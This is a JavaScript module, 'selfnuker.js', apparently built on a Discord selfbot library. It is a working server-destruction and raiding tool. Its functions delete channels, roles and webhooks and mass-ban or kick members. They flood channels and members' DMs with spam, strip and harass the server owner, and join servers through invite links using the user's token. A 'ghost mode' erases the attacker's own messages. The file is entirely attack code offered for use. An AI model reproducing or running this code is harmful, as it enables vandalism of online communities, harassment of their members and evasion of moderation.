// lang: JavaScript, file: selfnuker.js, target: Node.js 18+, discord.js-selfbot-v13

const TEXT_TYPES = new Set(['GUILD_TEXT', 'GUILD_NEWS', 'GUILD_PUBLIC_THREAD', 'GUILD_PRIVATE_THREAD']);
const sleep = ms => new Promise(r => setTimeout(r, ms));

class SelfNuker {
    constructor(client, log) {
        this.client = client;
        this.log    = log;
    }

    canSend(ch) {
        return TEXT_TYPES.has(ch.type) &&
               ch.permissionsFor(this.client.user)?.has('SEND_MESSAGES');
    }

    async deleteChannels(guild) {
        this.log(`[${guild.name}] Deleting ${guild.channels.cache.size} channels...`);
        await Promise.allSettled(
            guild.channels.cache.map(ch => ch.delete().catch(() => {}))
        );
        this.log(`[${guild.name}] ✓ channels gone`);
    }

    async deleteRoles(guild) {
        const roles = guild.roles.cache.filter(r => r.id !== guild.id && !r.managed);
        this.log(`[${guild.name}] Deleting ${roles.size} roles...`);
        await Promise.allSettled(roles.map(r => r.delete().catch(() => {})));
        this.log(`[${guild.name}] ✓ roles gone`);
    }

    async massBan(guild) {
        await guild.members.fetch().catch(() => {});
        const targets = guild.members.cache.filter(
            m => m.id !== this.client.user.id && m.id !== guild.ownerId && m.bannable
        );
        this.log(`[${guild.name}] Banning ${targets.size}...`);
        let n = 0;
        await Promise.allSettled(
            targets.map(m => m.ban({ reason: 'nuked' }).then(() => n++).catch(() => {}))
        );
        this.log(`[${guild.name}] ✓ banned ${n}`);
    }

    async massKick(guild) {
        await guild.members.fetch().catch(() => {});
        const targets = guild.members.cache.filter(
            m => m.id !== this.client.user.id && m.kickable
        );
        this.log(`[${guild.name}] Kicking ${targets.size}...`);
        let n = 0;
        await Promise.allSettled(
            targets.map(m => m.kick('nuked').then(() => n++).catch(() => {}))
        );
        this.log(`[${guild.name}] ✓ kicked ${n}`);
    }

    async spamChannels(guild, count = 50, name = 'nuked') {
        this.log(`[${guild.name}] Creating ${count} channels...`);
        await Promise.allSettled(
            Array.from({ length: count }, (_, i) =>
                guild.channels.create(`${name}-${i}`, { type: 'GUILD_TEXT' }).catch(() => {})
            )
        );
        this.log(`[${guild.name}] ✓ spam channels done`);
    }

    async spamRoles(guild, count = 50, name = 'nuked') {
        this.log(`[${guild.name}] Creating ${count} roles...`);
        await Promise.allSettled(
            Array.from({ length: count }, (_, i) =>
                guild.roles.create({ name: `${name}-${i}` }).catch(() => {})
            )
        );
        this.log(`[${guild.name}] ✓ spam roles done`);
    }

    async deleteWebhooks(guild) {
        try {
            const wh = await guild.fetchWebhooks();
            this.log(`[${guild.name}] Deleting ${wh.size} webhooks...`);
            await Promise.allSettled(wh.map(w => w.delete().catch(() => {})));
            this.log(`[${guild.name}] ✓ webhooks gone`);
        } catch (e) { this.log(`[${guild.name}] webhook: ${e.message}`); }
    }

    async creatorNuke(guild) {
        this.log(`[${guild.name}] Creator nuke → ${guild.ownerId}`);
        try {
            const owner = await guild.members.fetch(guild.ownerId);
            const roles = owner.roles.cache.filter(r => r.id !== guild.id && !r.managed);
            await Promise.allSettled(roles.map(r => owner.roles.remove(r).catch(() => {})));
            this.log(`  stripped ${roles.size} roles`);
            if (owner.voice?.channel) {
                await owner.voice.setMute(true).catch(() => {});
                await owner.voice.setDeaf(true).catch(() => {});
                this.log(`  muted/deafened in VC`);
            }
            await Promise.allSettled(
                Array.from({ length: 15 }, () =>
                    owner.user.send('☢ your server has been nuked ☢').catch(() => {})
                )
            );
            this.log(`  DM spammed owner`);
        } catch (e) { this.log(`  creator nuke partial: ${e.message}`); }
    }

    async renameAll(guild, name = 'nuked') {
        await Promise.allSettled([
            ...guild.channels.cache.map(ch => ch.setName(name).catch(() => {})),
            ...guild.roles.cache
                .filter(r => r.id !== guild.id && !r.managed)
                .map(r => r.setName(name).catch(() => {})),
        ]);
        this.log(`[${guild.name}] ✓ all renamed → ${name}`);
    }

    async renameServer(guild, name = '☢ NUKED ☢') {
        await guild.setName(name).catch(e => this.log(`rename: ${e.message}`));
        this.log(`[${guild.name}] ✓ server renamed → ${name}`);
    }

    async changeIcon(guild) {
        const red = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ' +
                    'AAAAC0lEQVQI12NgAAIABQAABjkB6QAAAABJRU5ErkJggg==';
        await guild.setIcon(red).catch(e => this.log(`icon: ${e.message}`));
        this.log(`[${guild.name}] ✓ icon changed`);
    }

    async spamMessages(guild, message = '☢ nuked ☢', count = 20) {
        const channels = guild.channels.cache.filter(ch => this.canSend(ch));
        this.log(`[${guild.name}] Spamming ${channels.size} channels × ${count}...`);
        let total = 0;
        for (const [, ch] of channels) {
            for (let i = 0; i < count; i++) {
                await ch.send(message).then(() => total++).catch(() => {});
                await sleep(150);
            }
        }
        this.log(`[${guild.name}] ✓ sent ${total} messages`);
    }

    async massDMAll(guild, message = '☢ your server is dead ☢') {
        await guild.members.fetch().catch(() => {});
        const members = guild.members.cache.filter(
            m => m.id !== this.client.user.id && !m.user.bot
        );
        this.log(`[${guild.name}] Mass DM → ${members.size} members...`);
        let n = 0;
        for (const [, m] of members) {
            await m.send(message).then(() => n++).catch(() => {});
            await sleep(800);
        }
        this.log(`[${guild.name}] ✓ DMed ${n}`);
    }

    async ghostMode(guild) {
        const channels = guild.channels.cache.filter(ch => TEXT_TYPES.has(ch.type));
        this.log(`[${guild.name}] Ghost mode — purging own messages from ${channels.size} channels...`);
        for (const [, ch] of channels) {
            let deleted = 0;
            try {
                let fetched = await ch.messages.fetch({ limit: 100 });
                while (fetched.size > 0) {
                    const own = fetched.filter(m => m.author.id === this.client.user.id);
                    if (own.size === 0) break;
                    for (const [, msg] of own) {
                        await msg.delete().catch(() => {});
                        await sleep(350);
                        deleted++;
                    }
                    if (fetched.size < 100) break;
                    fetched = await ch.messages.fetch({ limit: 100 });
                }
                if (deleted) this.log(`  #${ch.name}: deleted ${deleted}`);
            } catch (_) {}
        }
        this.log(`[${guild.name}] ✓ ghost done`);
    }

    async leaveServer(guild) {
        const name = guild.name;
        await guild.leave().catch(e => this.log(`leave error: ${e.message}`));
        this.log(`left: ${name}`);
    }

    async changeUsername(name) {
        await this.client.user.setUsername(name).catch(e => this.log(`username: ${e.message}`));
        this.log(`username → ${name}`);
    }

    async inviteRaid(inviteCode, ops, config = {}) {
        this.log(`raid → ${inviteCode}`);
        try {
            const data = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`, {
                method: 'POST',
                headers: {
                    'Authorization': this.client.token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Context-Properties': 'e30=',
                },
                body: JSON.stringify({ session_id: null }),
            }).then(r => r.json());

            if (!data.guild) {
                this.log(`join failed: ${data.message || JSON.stringify(data)}`);
                return;
            }

            const guildId = data.guild.id;
            this.log(`joined: ${data.guild.name} (${guildId})`);

            let guild = null;
            for (let i = 0; i < 15; i++) {
                await sleep(1000);
                guild = this.client.guilds.cache.get(guildId);
                if (guild) break;
            }
            if (!guild) {
                try { guild = await this.client.guilds.fetch(guildId); }
                catch (e) { this.log(`guild not in cache: ${e.message}`); return; }
            }

            await this.execute(guild, ops, config);
        } catch (e) { this.log(`raid error: ${e.message}`); }
    }

    async fullRageNuke(guild) {
        this.log(`[${guild.name}] ☢ SELF FULL RAGE NUKE ☢`);
        await this.deleteWebhooks(guild);
        await this.creatorNuke(guild);
        await this.massDMAll(guild, '☢ this server is dead ☢');
        await this.deleteChannels(guild);
        await this.deleteRoles(guild);
        await this.spamChannels(guild, 100, '☢');
        await this.spamRoles(guild, 50, '☢');
        await this.massBan(guild);
        await this.renameServer(guild, '☢ SELF NUKED ☢');
        await this.changeIcon(guild);
        this.log(`[${guild.name}] ☢ COMPLETE ☢`);
    }

    async rageQuit(guild) {
        this.log(`[${guild.name}] 🏃 RAGE QUIT`);
        await this.spamMessages(guild, '@everyone ☢ SERVER IS DEAD ☢', 15);
        await this.massDMAll(guild, 'your server is dead');
        await this.leaveServer(guild);
    }

    async ghostNuke(guild) {
        this.log(`[${guild.name}] 👻 GHOST NUKE`);
        await this.ghostMode(guild);
        await this.massBan(guild);
        await this.deleteChannels(guild);
        await this.deleteRoles(guild);
        await this.leaveServer(guild);
    }

    async floodMode(guild) {
        this.log(`[${guild.name}] 💬 FLOOD MODE`);
        await this.spamMessages(guild, '@everyone ☢ NUKED ☢', 30);
        await this.massDMAll(guild, '☢ this server is dead ☢');
    }

    async adminNuke(guild) {
        this.log(`[${guild.name}] ⚔️ ADMIN NUKE`);
        await this.deleteWebhooks(guild);
        await this.deleteChannels(guild);
        await this.deleteRoles(guild);
        await this.spamChannels(guild, 100, '☢-nuked');
        await this.massBan(guild);
        await this.renameServer(guild, '☢ NUKED ☢');
        await this.changeIcon(guild);
        this.log(`[${guild.name}] ✓ admin nuke complete`);
    }

    async execute(guild, operations, config = {}) {
        const {
            spamMsg    = '☢ nuked ☢',
            spamCount  = '20',
            spamName   = 'nuked',
            serverName = '☢ NUKED ☢',
            dmMsg      = '☢ your server is dead ☢',
        } = config;

        const map = {
            deleteChannels:  () => this.deleteChannels(guild),
            deleteRoles:     () => this.deleteRoles(guild),
            massBan:         () => this.massBan(guild),
            massKick:        () => this.massKick(guild),
            spamChannels:    () => this.spamChannels(guild, +spamCount || 50, spamName),
            spamRoles:       () => this.spamRoles(guild, +spamCount || 50, spamName),
            deleteWebhooks:  () => this.deleteWebhooks(guild),
            creatorNuke:     () => this.creatorNuke(guild),
            renameAll:       () => this.renameAll(guild, spamName),
            renameServer:    () => this.renameServer(guild, serverName),
            changeIcon:      () => this.changeIcon(guild),
            spamMessages:    () => this.spamMessages(guild, spamMsg, +spamCount || 20),
            massDMAll:       () => this.massDMAll(guild, dmMsg),
            ghostMode:       () => this.ghostMode(guild),
            leaveServer:     () => this.leaveServer(guild),
            fullRageNuke:    () => this.fullRageNuke(guild),
            rageQuit:        () => this.rageQuit(guild),
            ghostNuke:       () => this.ghostNuke(guild),
            floodMode:       () => this.floodMode(guild),
            adminNuke:       () => this.adminNuke(guild),
        };

        for (const op of operations) {
            if (map[op]) await map[op]().catch(e => this.log(`[op:${op}] ${e.message}`));
        }
        this.log(`[${guild.name}] ═══ SELFBOT OPS COMPLETE ═══`);
    }
}

module.exports = SelfNuker;
